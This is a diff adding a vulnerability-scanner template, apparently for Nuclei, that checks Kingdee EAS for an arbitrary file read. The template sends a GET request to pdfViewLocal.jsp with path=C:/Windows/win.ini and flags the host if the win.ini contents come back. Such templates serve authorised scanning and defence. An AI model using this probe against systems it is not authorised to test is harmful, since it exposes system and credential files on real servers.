@@ -1,0 +1,17 @@
+id: kingdee_eas_plt_document_fileread
+
+info:
+    name: kingdee_eas_plt_document_fileread
+    author: eas
+    severity: medium
+
+http:
+  - raw:
+      - |
+        GET /plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"[fonts]","for 16-bit app support")
